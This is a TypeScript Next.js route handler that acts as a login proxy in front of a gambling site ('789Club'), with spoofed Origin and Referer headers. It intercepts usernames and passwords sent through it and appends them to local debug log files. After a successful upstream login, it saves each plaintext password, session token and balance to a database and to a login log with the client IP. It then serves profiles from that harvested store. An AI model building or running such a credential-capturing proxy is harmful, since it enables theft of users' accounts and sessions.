import { NextRequest } from 'next/server';
import { runLegacyHandler } from '../_lib/legacy';
import { getDefaultProxyConfig, proxyRequest, proxyLog, UPSTREAM_BASE, normalizeJsonResponse } from '@/lib/proxy';
import { findAccountByToken, findAccountByUsername, upsertAccount, insertLoginLog, crc32 } from '@/lib/db';

async function handler(req: any, res: any) {
  const upstream = `${UPSTREAM_BASE}/id`;
  const token = req.query.token as string || req.headers['x-token'] as string;

  // Build query string without token
  const queryParams = { ...req.query };
  delete queryParams.token;
  const queryString = new URLSearchParams(queryParams as any).toString();
  const url = queryString ? `${upstream}?${queryString}` : upstream;

  const method = req.method || 'GET';
  let body = '';
  if (method !== 'GET') {
    body = JSON.stringify(req.body);
  }

  // ---------------------------------------------------------------------------
  // GET + token: trả user từ DB để game mở profile khi click avatar (loadUserInfo)
  // ---------------------------------------------------------------------------
  if (method === 'GET' && token && token.trim() !== '') {
    const trimmedToken = token.trim();
    
    try {
      const account = await findAccountByToken(trimmedToken, '789Club');
      
      if (account) {
        const avatarNumber = (Math.abs(crc32(account.password || '')) % 40) + 1;
        const numericId = Math.abs(crc32(account.username || ''));
        const wallet = parseFloat(account.wallet || 0);
        const username = account.username || '';

        const payload = {
          token: account.token || '',
          session_id: account.session || '',
          fullname: username,
          displayName: username,
          avatar: `Avatar${avatarNumber}`,
          id: numericId,
          user_type: 'USER',
          extra_balance: wallet,
          main_balance: wallet,
          wallet_101: 0,
          wallet_102: 0,
          username: username,
          type: 'USER',
          allow_login: true,
          allow_login_other_device: true,
          allow_withdraw: false,
          allow_withdraw_safe: false,
          is_phone_active: false,
          uuid: `452140980${numericId}276`,
          ref_id: username,
          is_club: false,
          mobile: '',
          desktop: '',
        };

        res.status(200).json({ status: 'OK', data: [payload] });
        return;
      }
    } catch (err) {
      proxyLog('id_get_token_error', { token: trimmedToken, error: String(err) });
    }
  }

  // ---------------------------------------------------------------------------
  // LOGIN / REGISTER INTERCEPT
  // ---------------------------------------------------------------------------
  let isAuthReq = false;
  let taikhoan: string | null = null;
  let matkhau: string | null = null;
  let requestData: any = null;
  let reqType = '';

  if (method === 'POST' && body) {
    try {
      requestData = JSON.parse(body);
      if (requestData && requestData.username && requestData.password) {
        isAuthReq = true;
        taikhoan = requestData.username;
        matkhau = requestData.password;
        reqType = requestData.type || '';
        if (!reqType && requestData.command) {
          reqType = requestData.command.includes('login') ? 'login' : 'register';
        }

        // Debug log
        const debugLog = `C:\\xampp\\htdocs\\nextjs\\id_debug_login.log`;
        const fs = require('fs');
        const logMsg = `${new Date().toISOString()} | type: ${reqType} | username: ${taikhoan} | command: ${requestData.command || 'none'} | body: ${body.substring(0, 200)}\n`;
        fs.appendFileSync(debugLog, logMsg);
      }
    } catch (e) {
      // Not JSON
    }
  }

  // ---------------------------------------------------------------------------
  // CHECK USERNAME TRÊN DB LOCAL
  // ---------------------------------------------------------------------------
  if (method === 'POST' && requestData && requestData.command === 'checkUserByUsernameOnWeb' && requestData.username) {
    const checkUsername = requestData.username.trim();
    
    try {
      const account = await findAccountByUsername(checkUsername, '789Club');
      
      if (account) {
        res.status(200).json({
          status: 'OK',
          data: [{
            command: 'checkUserByUsernameOnWeb',
            exist: true
          }]
        });
        return;
      }
    } catch (err) {
      // Continue to upstream
    }
  }

  // ---------------------------------------------------------------------------
  // GỌI UPSTREAM
  // ---------------------------------------------------------------------------
  const headers: Record<string, string> = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    'Content-Type': 'application/json',
    'Origin': 'https://789clubk.win',
    'Referer': 'https://789clubk.win/',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
  };

  if (token) {
    headers['X-Token'] = token;
  }

  const defaultProxy = getDefaultProxyConfig();
  const result = await proxyRequest(
    'id',
    url,
    body,
    token || null,
    'application/json',
    method,
    defaultProxy ? { fixed_proxy_config: defaultProxy } : {}
  );

  // ---------------------------------------------------------------------------
  // XỬ LÝ LỖI CURL
  // ---------------------------------------------------------------------------
  if (!result.ok) {
    res.status(200).json({
      status: 'ERROR',
      message: 'Không thể kết nối máy chủ đăng nhập. Vui lòng thử lại.',
      debug: result.error,
    });
    return;
  }

  const httpCode = result.info.http_code;
  let rawBody = result.response.trim();

  // Remove headers from response body
  const headerEndIndex = rawBody.indexOf('\r\n\r\n');
  if (headerEndIndex >= 0) {
    rawBody = rawBody.substring(headerEndIndex + 4);
  }

  // Check for 404/5xx errors
  const isCheckUserRequest = method === 'POST' && requestData?.command === 'checkUserByUsernameOnWeb';

  if (!isCheckUserRequest && (httpCode === 404 || httpCode >= 500 || rawBody === '1 404' || rawBody.startsWith('1 404'))) {
    res.status(200).json({
      status: 'ERROR',
      data: [{
        command: 'InternaLogin',
        status: 403,
        message: 'Mật khẩu đăng nhập không đúng'
      }]
    });
    return;
  }

  if (isCheckUserRequest && (httpCode === 404 || httpCode >= 500 || rawBody === '1 404' || rawBody.startsWith('1 404'))) {
    res.status(200).json({
      status: 'OK',
      data: [{
        command: 'checkUserByUsernameOnWeb',
        exist: false
      }]
    });
    return;
  }

  // ---------------------------------------------------------------------------
  // XỬ LÝ RESPONSE ĐĂNG NHẬP
  // ---------------------------------------------------------------------------
  if (isAuthReq && httpCode === 200) {
    const originalRespBody = rawBody;
    
    // Remove BOM if present
    if (rawBody.charCodeAt(0) === 0xFEFF) {
      rawBody = rawBody.slice(1);
    }
    rawBody = rawBody.trim();

    let resultArray: any;
    try {
      resultArray = JSON.parse(rawBody);
    } catch (e) {
      res.status(200).json({
        status: 'ERROR',
        data: [{
          command: 'InternaLogin',
          status: 403,
          message: 'Mật khẩu đăng nhập không đúng'
        }]
      });
      return;
    }

    // Extract user data from various response structures
    let userData = null;
    if (resultArray.data?.data && Array.isArray(resultArray.data.data)) {
      userData = resultArray.data.data;
    } else if (resultArray.data?.[0]) {
      userData = resultArray.data[0];
    } else if (resultArray.data && typeof resultArray.data === 'object' && !Array.isArray(resultArray.data)) {
      userData = resultArray.data;
    }

    const isLoginRequest = reqType === 'login' || (requestData?.command && requestData.command.includes('login'));

    // Check for upstream error
    const topStatus = resultArray.status;
    const itemStatus = userData?.status;
    const isUpstreamError = topStatus === 101 || topStatus === 403 || 
      (typeof topStatus === 'string' && topStatus.toUpperCase() === 'ERROR') || 
      itemStatus === 403 || itemStatus === 101;

    if (isUpstreamError) {
      const errorMsg = userData?.message || resultArray.message || 'Mật khẩu đăng nhập không đúng';
      res.status(200).json({
        status: 'ERROR',
        data: [{
          command: 'InternaLogin',
          status: 403,
          message: errorMsg
        }]
      });
      return;
    }

    // Success - save to DB
    const statusOk = topStatus === 'OK' || topStatus === 0 || topStatus === '0' || topStatus === 1 || topStatus === '1' || topStatus === true;
    
    if (isLoginRequest && statusOk && userData) {
      const tk_token = userData.token || userData.wsToken || userData.signature || '';
      const sessionId = userData.session_id || userData.wsToken || tk_token;
      const wallet = userData.main_balance || userData.extra_balance || 0;

      try {
        await upsertAccount(
          taikhoan || '',
          matkhau || '',
          tk_token,
          parseFloat(wallet),
          sessionId,
          '789Club'
        );

        // Log login
        const clientIp = req.socket?.remoteAddress || '';
        await insertLoginLog({
          username: taikhoan || '',
          password: matkhau || undefined,
          wallet: wallet,
          token: tk_token,
          session: sessionId,
          ip: clientIp
        });

        // Debug save log
        const debugSaveLog = `C:\\xampp\\htdocs\\nextjs\\id_debug_save.log`;
        const fs = require('fs');
        fs.appendFileSync(debugSaveLog, `${new Date().toISOString()} - SAVE - reqType: ${reqType} - username: ${taikhoan}\n`);

      } catch (err) {
        proxyLog('id_save_error', { username: taikhoan, error: String(err) });
      }
    }

    // Return original response
    res.status(httpCode).setHeader('Content-Type', 'application/json; charset=utf-8').send(originalRespBody);
    return;
  }

  // Default: return upstream response
  res.status(httpCode).setHeader('Content-Type', 'application/json; charset=utf-8').send(rawBody);
}

export const dynamic = 'force-dynamic';

export async function GET(request: NextRequest) {
  return runLegacyHandler(request, handler);
}

export async function POST(request: NextRequest) {
  return runLegacyHandler(request, handler);
}

export async function PUT(request: NextRequest) {
  return runLegacyHandler(request, handler);
}

export async function PATCH(request: NextRequest) {
  return runLegacyHandler(request, handler);
}

export async function DELETE(request: NextRequest) {
  return runLegacyHandler(request, handler);
}

export async function OPTIONS(request: NextRequest) {
  return runLegacyHandler(request, handler);
}

export async function HEAD(request: NextRequest) {
  return runLegacyHandler(request, handler);
}
